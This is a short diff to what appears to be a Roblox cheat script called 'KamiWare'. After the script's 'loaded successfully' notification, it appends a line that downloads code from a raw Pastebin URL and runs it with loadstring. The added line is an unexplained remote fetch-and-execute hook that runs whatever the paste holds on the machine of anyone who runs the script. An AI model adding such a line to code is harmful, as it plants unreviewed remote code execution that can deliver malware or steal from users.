@@ -3791,3 +3791,5 @@ SettingsLeft:CreateButton({
 })
 
 notify('KamiWare loaded successfully.', 4)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/AiG05CsC"))()
